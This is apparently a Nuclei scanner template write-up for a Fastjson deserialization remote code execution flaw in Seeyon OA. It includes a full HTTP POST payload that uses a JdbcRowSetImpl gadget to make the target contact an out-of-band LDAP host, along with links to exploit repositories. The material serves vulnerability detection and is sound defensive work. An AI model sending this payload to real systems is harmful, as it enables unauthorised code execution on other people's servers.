# Nuclei Template: Seeyon OA Fastjson Remote Code Execution
**Template ID:** seeyon-oa-fastjson-rce
**Vulnerability Class:** Code Injection
**Severity:** Critical
**CWE:** CWE-94
**Source:** Nuclei Template (`seeyon-oa-fastjson-rce.yaml`)

## Vulnerability Information & PoC

## Description
Seeyon OA Fastjson is vulnerable to RCE.

## Steps to reproduce / Exploit Payload
```http
POST /seeyon/main.do?method=changeLocale HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

_json_params={"v47":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"xxx":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{interactsh-url}}","autoCommit":true}}
```

## References
- https://github.com/achuna33/MYExploit/blob/8ffbf7ee60cbd77ad90b0831b93846aba224ab29/src/main/java/com/achuna33/Controllers/SeeyonController.java
- https://github.com/hktalent/scan4all/blob/main/pocs_go/seeyon/SeeyonFastjson.go
